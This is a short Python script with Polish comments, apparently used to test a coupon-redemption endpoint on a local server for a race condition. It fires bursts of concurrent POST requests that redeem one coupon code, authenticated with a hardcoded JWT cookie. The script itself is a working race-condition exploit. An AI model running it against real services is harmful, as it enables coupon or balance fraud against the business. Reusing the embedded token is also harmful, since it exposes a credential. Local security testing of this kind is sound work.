# race_redeem_local.py
"""
Flood-script do testu race-condition /redeem (wersja form-urlencoded).
pip install aiohttp
"""

import asyncio
from aiohttp import ClientSession, TCPConnector

# === KONFIGURACJA ===
HOST        = "http://localhost:8000"      # lokalny serwer
PATH        = "/redeem"                    # endpoint zgodny z requestem
COUPON_CODE = "3WS07CV5"                   # kod z Twojego przykładu
ACCESS_JWT  = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJzdWIiOiJkc2Rhc2RzYUB3cC5wbCIsImV4cCI6MTc0ODQyNDYxMX0."
    "lRaV-8I9wefeWmXHIBfmBQge16AcGPAruWWsONYmDkA"
)

ROUNDS = 12          # liczba powtórzeń (serii)
BURST  = 10           # żądania równoległe w jednej serii

# === STAŁE ===
URL     = f"{HOST}{PATH}"
HEADERS = {
    "Cookie": f"access_token={ACCESS_JWT}",
    "Content-Type": "application/x-www-form-urlencoded",
    # opcjonalnie: User-Agent, Accept…
}
PAYLOAD = f"code={COUPON_CODE}"            # prosty body form-urlencoded


async def fire_one(session: ClientSession, idx: int) -> None:
    """Pojedynczy strzał POST /redeem."""
    try:
        async with session.post(URL, data=PAYLOAD, headers=HEADERS) as resp:
            txt = await resp.text()
            print(f"[{idx}] {resp.status} {len(txt)}B")
    except Exception as exc:
        print(f"[{idx}] wyjątek: {exc}")


async def main() -> None:
    connector = TCPConnector(limit=None)
    async with ClientSession(connector=connector) as session:
        counter = 0
        for _ in range(ROUNDS):
            tasks = [
                asyncio.create_task(fire_one(session, counter + i))
                for i in range(BURST)
            ]
            counter += BURST
            await asyncio.gather(*tasks)
        print("🏁  Zakończono wszystkie serie!")


if __name__ == "__main__":
    asyncio.run(main())
